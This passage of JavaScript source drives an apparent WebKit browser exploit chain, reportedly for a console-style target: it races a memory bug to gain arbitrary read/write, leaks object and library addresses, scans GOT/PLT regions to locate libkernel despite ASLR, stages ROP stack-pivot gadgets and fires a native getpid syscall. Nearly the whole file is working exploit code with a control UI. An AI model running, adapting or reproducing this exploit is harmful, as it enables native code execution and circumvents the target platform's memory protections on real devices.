                scanState("ELF score " + chunk.scored + "/" + chunk.total
                    + " best=" + (chunk.best ? chunk.best.score : 0));
            else if (chunk.phase === "psfree-next")
                mark("LK-PSFREE", "ELF miss modules=" + (chunk.modules || 0)
                    + " best=" + (chunk.bestScore || 0) + " — trying PLT");
            else if (chunk.phase === "psfree-start")
                mark("LK-PSFREE", "trying low PLT imports (__stack_chk_fail class)");
            else if (chunk.phase === "psfree" || chunk.phase === "psfree-region")
                scanState("PSFree PLT +0x" + chunk.cursor.toString(16)
                    + " tried=" + chunk.tried);
            else if (chunk.phase === "plt-next")
                mark("LK-PLT", "PSFree miss tried=" + (chunk.tried || 0)
                    + " — full PLT→GOT scan");
            else if (chunk.phase === "plt-start")
                mark("LK-PLT", "scan .text xrefs spans=" + chunk.spans);
            else if (chunk.phase === "plt-region")
                mark("LK-PHASE", "PLT " + chunk.region + " @+0x"
                    + chunk.cursor.toString(16) + " refs=" + chunk.refs);
            else if (chunk.phase === "plt")
                scanState("PLT +0x" + chunk.cursor.toString(16) + " refs=" + chunk.refs);
            else if (chunk.phase === "got-next")
                mark("LK-GOT", "PLT miss refs=" + (chunk.refs || 0) + " — RELRO brute");
            else if (chunk.phase === "got-start" || chunk.phase === "rw-start")
                mark("LK-GOT", "segments: " + chunk.ranges);
            else if (chunk.phase === "got-region" || chunk.phase === "rw-region")
                mark("LK-PHASE", chunk.region + " @+0x" + chunk.cursor.toString(16));
            else if (chunk.phase === "got" || chunk.phase === "rw")
                scanState("GOT +0x" + chunk.cursor.toString(16)
                    + "…+0x" + chunk.end.toString(16) + " tried=" + chunk.slots);
            else if (chunk.phase === "no-got" || chunk.phase === "no-rw")
                mark("LK-MISS", "no RELRO segment");
            else if (chunk.phase === "base-next")
                mark("LK-BASE", "GOT miss got=" + (chunk.slots || 0)
                    + " — prologue hunt ±256MB");
            else if (chunk.phase === "base-start" || chunk.phase === "base-anchor")
                mark("LK-BASE", "anchor#" + chunk.anchor + " "
                    + chunk.from + "…" + chunk.to);
            else if (chunk.phase === "base")
                scanState("prologue a#" + chunk.anchor + " @" + chunk.at
                    + " probes=" + chunk.probes);
            else if (chunk.phase === "stub-next")
                mark("LK-STUB", "base miss — getpid stub hunt");
            else if (chunk.phase === "stub-start" || chunk.phase === "stub-anchor")
                mark("LK-STUB", "anchor#" + chunk.anchor + " "
                    + chunk.from + "…" + chunk.to);
            else if (chunk.phase === "stub")
                scanState("stub a#" + chunk.anchor + " @" + chunk.at
                    + " probes=" + chunk.probes);
            if (chunk.done && chunk.lk) {
                const iat = chunk.iatRva != null
                    ? " IAT +0x" + chunk.iatRva.toString(16) : "";
                const extra = chunk.stubAt
                    ? " stub@" + chunk.stubAt
                        + (chunk.stubOff != null ? "+0x" + chunk.stubOff.toString(16) : "")
                    : "";
                mark("LK-OK", chunk.lk + iat + extra
                    + " (" + (chunk.source || chunk.phase || "?") + ")");
                state("libkernel OK", "ok");
                break;
            }
            if (chunk.done) {
                if (chunk.phase === "lite-miss") {
                    state("libkernel miss", "bad");
                    break;
                }
                logLibkernelMissSummary(chunk, iatScanState, webkitBase, nativeFn);
                state("libkernel miss", "bad");
                break;
            }
            if ((ticks & 7) === 0)
                renderOut();
            if ((ticks & 15) === 0)
                await new Promise(r => setTimeout(r, 2));
            else
                await new Promise(r => setTimeout(r, 0));
        }
        if (ticks >= maxTicks) {
            mark("LK-FAIL", "libkernel scan timeout — reload and retry");
            state("libkernel scan timeout", "bad");
        }
    } catch (err) {
        mark("LK-FAIL", err.message || String(err));
        state("libkernel scan error", "bad");
    } finally {
        busy = false;
        iatScanState = null;
        setUi();
        renderOut();
    }
}

async function ensureLibkernel(p, off, webkitBase) {
    const forced = loadForcedLibkernel();
    if (forced) return forced;
    if (nativeQuiet) {
        try {
            const raw = sessionStorage.getItem("wk-libkernelBase");
            if (raw) {
                const lk = parseAddr(String(raw).replace(/^0x/i, ""));
                if (lk) return lk;
            }
        } catch (_) { }
    }
    const r = resolveLibkernel(p, webkitBase, off, { log: mark, read8: read8p });
    if (r.ok) return r.lk;
    throw new Error("libkernel unknown — Load cal ptr → Force lk");
}

function ensureUiVisible() {
    for (const id of ["groom-bar", "toolbar", "gadget-base", "gadget-pop",
        "gadget-g5", "gadget-pivot", "peek-bar", "hint", "map", "hex"]) {
        const el = document.getElementById(id);
        if (el) el.style.display = "";
    }
    const mapTable = document.getElementById("map");
    if (mapTable && mapTable.previousElementSibling)
        mapTable.previousElementSibling.style.display = "";
    const hexEl = document.getElementById("hex");
    if (hexEl && hexEl.previousElementSibling)
        hexEl.previousElementSibling.style.display = "";
}

function resolveWebkitBase(off, nativeFn) {
    try {
        const raw = sessionStorage.getItem("wk-webkitBase");
        if (raw) {
            const b = parseAddr(String(raw).replace(/^0x/i, ""));
            if (b) return b;
        }
    } catch (_) { }
    if (nativeFn && off.wk_expm1_builtin)
        return nativeFn.sub32(off.wk_expm1_builtin);
    return null;
}

function lkFromUi() {
    return loadForcedLibkernel()
        || (addrIn && addrIn.value
            ? parseAddr(String(addrIn.value).replace(/^0x/i, "")) : null);
}

/** Capture expm1 + slab once at PRIMITIVE-OK — before any other taps eat heap. */
function ensureNativePrep(p, off) {
    if (nativePrep) return nativePrep;
    const cell = p.leakval(Math.expm1);
    const jfn = p.read8(cell.add32(0x18));
    const mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
    const mainOrig = p.read8(mainMf);
    const nativeFn = mainOrig;
    if (!nativeFn) throw new Error("nativeFn capture failed");
    const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    try {
        sessionStorage.setItem("wk-nativeFn", String(nativeFn));
        sessionStorage.setItem("wk-webkitBase", String(webkitBase));
    } catch (_) { }
    const pivotObj = {};
    const pivotCell = p.leakval(pivotObj);
    nativePrep = prepNativeChain(p, off, webkitBase, {
        mainMf, mainOrig, pivotObj, pivotCell,
    });
    nativePrep.keepAlive.push(pivotObj);
    return nativePrep;
}

function getpidStubAddr(lk, off) {
    const stubOff = (off.k_stubs && off.k_stubs[SYS_GETPID]) || 0x2cb70;
    return { stub: lk.add32(stubOff), stubOff };
}

/** Force lk — 0 reads, session only. Arm + Fire are separate taps. */
function runForceLkOnly(lk) {
    if (busy || !ready) return;
    const lkWarn = validateLkBase(lk);
    if (lkWarn) mark("LK-WARN", lkWarn);
    const off = loadEffectiveOff();
    const { stub, stubOff } = getpidStubAddr(lk, off);
    saveLibkernelSession(lk, null, { forced: true });
    mark("LK-OK", "forced " + lk + " (0 reads) stub=" + stub + " lk+" + stubOff.toString(16));
    state("lk forced — tap Arm getpid", "warn");
    renderOut();
    try {
        crashLog.append("LK-OK forced " + lk + " stub=" + stub, "LK-OK");
        crashLog.flushSync();
    } catch (_) { }
}

function runArmGetpid() {
    if (busy || !ready || !window.p || !nativeAllowed) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const lk = lkFromUi();
    if (!lk) {
        mark("NATIVE-SKIP", "Force lk first — Load cal ptr → hex → Force lk");
        state("Force lk first", "bad");
        return;
    }
    busy = true;
    setUi();
    nativeQuiet = true;
    try {
        if (!nativePrep) ensureNativePrep(p, off);
        stageGetpid(p, nativePrep, lk, off);
        nativeStaged = true;
        mark("NATIVE-ARMED", "G0 set — tap Fire getpid");
        state("armed — Fire getpid", "warn");
        crashLog.append("NATIVE-ARMED lk=" + lk, "NATIVE-ARM");
        crashLog.flushSync();
    } catch (err) {
        mark("NATIVE-FAIL", "arm: " + (err.message || String(err)));
        state("arm failed", "bad");
    } finally {
        nativeQuiet = false;
        busy = false;
        setUi();
        renderOut();
    }
}

function runFireGetpid() {
    if (busy || !ready || !window.p || !nativeAllowed) return;
    if (!nativePrep || !nativeStaged) {
        runArmGetpid();
        return;
    }
    busy = true;
    setUi();
    nativeQuiet = true;
    lkQuiet = true;
    retained.length = 0;
    pointers.length = 0;
    if (outEl) outEl.textContent = "Fire getpid…";

    let pid = -1;
    let errMsg = null;
    const p = window.p;
    const lk = lkFromUi();
    const { stub } = getpidStubAddr(lk, loadEffectiveOff());
    try {
        crashLog.append("NATIVE-FIRE-RETRY stub=" + stub, "NATIVE-FIRE");
        crashLog.flushSync();
        pid = fireGetpid(p, nativePrep);
    } catch (err) {
        errMsg = err.message || String(err);
    }

    nativeQuiet = false;
    lkQuiet = false;
    nativeStaged = false;
    if (pid > 0) {
        mark("NATIVE-OK", "getpid=" + pid + " build=" + BUILD_ID);
        state("getpid OK pid=" + pid, "ok");
        try {
            if (lk) saveLibkernelSession(lk, null, { forced: true });
            crashLog.append("NATIVE-OK getpid=" + pid, "NATIVE-OK");
            crashLog.flushSync();
        } catch (_) { }
    } else {
        mark("NATIVE-FAIL", (errMsg || "getpid=" + pid) + " build=" + BUILD_ID);
        state("getpid failed", "bad");
    }
    if (outEl) outEl.textContent = lines.join("\n");
    pivotReady = true;
    busy = false;
    setUi();
}

async function doNativeCallImmediate() {
    if (nativeStaged) runFireGetpid();
    else runArmGetpid();
}

async function freeBeforeNative() {
    retained.length = 0;
    pointers.length = 0;
    raceBuf.length = 0;
    nativeStaged = false;
    if (lines.length > 8) lines.splice(0, lines.length - 8);
    if (mapBody) mapBody.innerHTML = "";
    if (outEl) outEl.textContent = lines.join("\n");
    exploit = null;
}

function seedNativeSession(p, off) {
    const fn = captureNativeFnQuick(p, off);
    if (fn) {
        try { sessionStorage.setItem("wk-nativeFn", String(fn)); } catch (_) { }
        const base = resolveWebkitBase(off, fn);
        if (base) try { sessionStorage.setItem("wk-webkitBase", String(base)); } catch (_) { }
    }
    return fn;
}

async function runRwProofManual() {
    if (busy || !ready || !window.p) return;
    busy = true;
    setUi();
    try {
        pointers.length = 0;
        renderMap();
        const ok = await runRwProof(window.p, loadEffectiveOff());
        mark(ok ? "PASS" : "WARN", "RW proof map done — " + pointers.length + " ptrs");
        state(ok ? "RW proof OK" : "RW proof partial", ok ? "ok" : "warn");
    } finally {
        busy = false;
        setUi();
    }
}

async function runNativeCall() {
    if (busy || !ready || !window.p) return;
    if (nativeStaged) runFireGetpid();
    else runArmGetpid();
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP,
    };
    return exploit;
}

function attemptCap() {
    if (!params.has("attempts")) return 0;
    const n = parseInt(params.get("attempts"), 10);
    return n > 0 ? n : 0;
}

function onRaceEvent(tag, detail) {
    if (!CORE_LOG.test(tag)) return;
    mark(tag, detail || "");

    if (tag === "ATTEMPT-START") {
        raceAttempt++;
        state("race attempt " + raceAttempt + "…", "warn");
        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
    }

    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
        lengthMissStreak++;
        if (lengthMissStreak === 8 || lengthMissStreak === 20)
            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom, close browser, reload");
    }

    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
        lengthMissStreak = 0;
}

async function establishOnce(establishPrimitive) {
    raceAttempt = 0;
    lengthMissStreak = 0;
    raceBuf.length = 0;
    raceMode = true;
    const cap = attemptCap();
    try {
        return await establishPrimitive({
            maxAttempts: cap,
            skipTrimDebris: true,
            onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } finally {
        raceMode = false;
        for (let i = 0; i < raceBuf.length; i++) {
            const line = raceBuf[i];
            const tag = line.split(/\s/)[0];
            if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|PRIMITIVE|PAIR|HINT/i.test(tag)) {
                let dup = false;
                for (let j = 0; j < lines.length; j++) {
                    if (lines[j] === line) { dup = true; break; }
                }
                if (!dup) lines.push(line);
            }
        }
        crashLog.appendMany(raceBuf);
        raceBuf.length = 0;
        if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
        crashLog.flushSync();
        renderOut();
    }
}

function bufAddr(p, off, ab) {
    const cell = walkCell(p, "ArrayBuffer", ab);
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    addPtr("ArrayBuffer impl", impl, "+0x" + off.wk_ArrayBuffer_m_impl.toString(16));
    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
    if (data) addPtr("ArrayBuffer backing", data, "m_contents.m_data");
    return data;
}

async function runRwProof(p, off) {
    const boxA = { tag: "demoA", n: 1 };
    const boxB = { tag: "demoB", n: 2 };
    walkCell(p, "JSObject A", boxA);
    walkCell(p, "JSObject B", boxB);

    const rowA = pointers.filter(x => x.label === "JSObject A cell").pop();
    const rowB = pointers.filter(x => x.label === "JSObject B cell").pop();
    const addrA = rowA ? parseAddr(String(rowA.addr).replace(/^0x/i, "")) : null;
    const addrB = rowB ? parseAddr(String(rowB.addr).replace(/^0x/i, "")) : null;

    const okLeak = addrA && addrB && !same64(addrA, addrB) && addrA.low !== 0;
    mark(okLeak ? "PASS" : "FAIL", "leakval-distinct  a=" + addrA + " b=" + addrB);

    const headerA = okLeak ? p.read8(addrA) : null;
    if (headerA) {
        p.write8(addrA, headerA);
    }
    const okHdr = headerA && same64(p.read8(addrA), headerA);
    mark(okHdr ? "PASS" : "FAIL", "read8-write8 header roundtrip");

    const probe = new ArrayBuffer(0x20);
    retained.push(probe);
    const view = new Uint32Array(probe);
    view[0] = 0xcafebabe;

    if (off) {
        const dataPtr = bufAddr(p, off, probe);
        if (!dataPtr) {
            mark("FAIL", "arraybuffer backing chain");
        } else {
            const got = read4p(p, dataPtr);
            const okR = got === 0xcafebabe;
            mark(okR ? "PASS" : "FAIL", "arraybuffer-read4  got=0x"
                + (got == null ? "null" : got.toString(16)));
            if (okR) {
                p.write4(dataPtr, new int64(0x600dbabe, 0));
                mark(view[0] === 0x600dbabe ? "PASS" : "FAIL", "arraybuffer-write4");
            }
        }
        captureNativeChain(p, off.wk_JSFunction_m_function || 0x28, off);
    }

    try { walkCell(p, "parseFloat", parseFloat); } catch (_) { }
    try { walkCell(p, "Object proto", Object); } catch (_) { }

    addPairStatusPtrs();
    renderMap();
    mark("ADDR-LIST", pointers.length + " pointers logged above");

    return okLeak && okHdr;
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    raceBuf.length = 0;
    crashLog.sessionMarker("START");
    if (outEl) renderOut();
    pointers.length = 0;
    renderMap();

    const detected = offsetsFor(navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        let carrier;
        try {
            carrier = await establishOnce(establishPrimitive);
        } catch (err) {
            if (/gave up/i.test(String(err.message))) {
                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
            }
            throw err;
        }

        installP(carrier, {
            promote: PROMOTE_PAIR,
            onEvent: (t, d) => {
                if (/PAIR|TRIM|RELEASE|FAIL|ERROR/i.test(t))
                    mark(t, d || "");
            },
        });
        window._wkCarrier = carrier;
        const p = window.p;
        if (!p) throw new Error("window.p missing");
        saveTextareaSession(p, carrier);

        nativeAllowed = pairStatus.state !== "broken";
        mark("PRIMITIVE-OK", "arb rw live");
        pivotReady = true;
        const off = loadEffectiveOff();
        try {
            ensureNativePrep(p, off);
            mark("NATIVE-PREP", "slab ready @ Start");
        } catch (prepErr) {
            mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
        }
        mark("HINT", "Scan GOT lite → Verify lk → Force lk → Arm → Fire getpid");
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted);
        ready = true;
        ensureUiVisible();
        state("primitive OK — Load cal ptr → Force lk → Fire getpid", "ok");
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

function refreshMap() {
    runRwProofManual();
}

function reportErr(err) {
    const msg = err && err.message ? err.message : String(err);
    state("error: " + msg, "bad");
    mark("ERROR", err && err.stack ? err.stack : msg);
}

function wireClick(el, fn) {
    if (!el) return;
    el.addEventListener("click", function () {
        try {
            const r = fn();
            if (r && typeof r.then === "function")
                r.catch(reportErr);
        } catch (err) {
            reportErr(err);
        }
    });
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    mapBody = $("map-body");
    hexEl = $("hex");
    pickPtr = $("pick-ptr");
    addrIn = $("addr-in");
    btnStart = $("btn-start");
    btnSaveBases = $("btn-save-bases");
    btnRwProof = $("btn-rw-proof");
    btnNative = $("btn-native");
    btnLoadCal = $("btn-load-cal");
    btnForceLk = $("btn-force-lk");
    btnGuessLk = $("btn-guess-lk");
    btnPsfreeLite = $("btn-psfree-lite");
    btnPsfreeLk = $("btn-psfree-lk");
    btnPsfreeStop = $("btn-psfree-stop");
    btnVerifyPivot = $("btn-verify-pivot");
    btnScanPivot = $("btn-scan-pivot");
    btnPeek = $("btn-peek");
    btnClear = $("btn-clear");

    if (!outEl || !btnStart) {
        state("UI missing — open via HTTP(S), not file://", "bad");
        return;
    }

    wireGadgetBars();
    wireG5Bar();
    ensureUiVisible();
    wireClick(btnStart, function () { return runStart(); });
    wireClick(btnSaveBases, saveBasesManual);
    wireClick(btnRwProof, function () { return runRwProofManual(); });
    wireClick(btnVerifyPivot, verifyPivotManual);
    wireClick(btnScanPivot, function () { return runPivotScanAuto(); });
    wireClick(btnNative, function () { return runNativeCall(); });
    wireClick(btnLoadCal, function () { runTryCalPtrs(); });
    wireClick(btnForceLk, function () { runManualTest("force-lk"); });
    wireClick(btnGuessLk, function () { runGuessLk(); });
    wireClick(btnPsfreeLite, function () { return runFindLkAuto(FIND_LK_LITE); });
    wireClick(btnPsfreeLk, function () { return runFindLkAuto(FIND_LK_NORM); });
    wireClick(btnPsfreeStop, function () { stopFindLk(); });
    wireClick(btnClear, function () {
        lines.length = 0;
        clearPersistedLog();
        if (outEl) outEl.textContent = "";
        mark("LOG-CLEAR", "sessionStorage log cleared");
    });
    wireClick(btnPeek, function () {
        const a = parseAddr(addrIn.value);
        if (!a) { mark("PEEK-FAIL", "bad hex"); return; }
        peekAt(a);
    });

    if (pickPtr) {
        pickPtr.addEventListener("change", function () {
            const i = parseInt(pickPtr.value, 10);
            if (!(i >= 0) || !pointers[i]) return;
            addrIn.value = pointers[i].addr.replace(/^0x/i, "");
        });
    }

    if (params.get("clearpivot") === "1") {
        try {
            sessionStorage.removeItem("wk-pivot-scan-state");
            sessionStorage.removeItem("wk-scanned-pivot");
            sessionStorage.removeItem("wk-scanned-pivot-base");
        } catch (_) { }
    }
    if (sanitizeScannedPivotStorage())
        mark("PIVOT-FIX", "removed poisoned G0-G4 scan RVAs from session");

    const g5raw = params.get("g5");
    if (g5raw) {
        const g5rva = parseInt(String(g5raw).replace(/^0x/i, ""), 16);
        if (g5rva > 0) {
            const found = loadScannedPivot() || Object.assign({}, PIVOT_HW_1352);
            found.wk_PUSH_RDX_POP_RSP_RET = g5rva;
            try { sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(found)); } catch (_) { }
            mark("G5-MANUAL", "+0x" + g5rva.toString(16) + " from ?g5= URL");
        }
    }

    if (params.get("clearlog") === "1") clearPersistedLog();
    else crashLog.restoreInto(lines);

    crashLog.startAutoFlush();
    mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
    mark("BOOT", "LK-PROBE line shows dynamic parse status");
    mark("BOOT", groomBootLine(params));
    window.addEventListener("beforeunload", function () {
        stopPivotScanQuiet();
        if (stateEl) crashLog.persistState(stateEl.textContent, stateEl.className, true);
        crashLog.flushSync();
        if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
    });
    wireGroomBar(() => busy);
    setUi();
    renderOut();
    state("ready — Start → Save bases → scan/verify pivot → Native call", "");
}

function bootUi() {
    try {
        init();
    } catch (err) {
        reportErr(err);
    }
}

if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bootUi);
else
    bootUi();
